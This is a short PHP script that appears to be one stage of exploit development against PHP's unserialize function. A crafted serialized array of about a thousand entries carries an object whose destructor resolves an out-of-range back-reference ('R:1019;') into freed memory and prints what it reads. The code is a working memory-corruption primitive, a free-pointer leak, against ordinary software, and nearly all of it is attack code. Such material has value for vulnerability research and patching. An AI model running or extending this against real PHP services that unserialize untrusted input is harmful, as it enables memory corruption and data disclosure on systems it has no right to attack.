<?php
/* L2-a: the free pointer. No spray; R:1019 (id 1018) resolves the extension
 * chunk's data[0] = &last_zval, the last element's real zval. */
class T {
    public function __destruct() {
        $r = @unserialize('R:1019;');
        fwrite(STDERR, "R1019 type=" . gettype($r)
            . " val=" . (is_string($r) ? $r : '-') . "\n");
    }
}
$N = 1016;
$p = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) { $p .= 'i:0;N;'; }
$p .= 'i:99999;O:1:"T":0:{}i:99999;s:6:"HELLO!";}';
@unserialize($p);
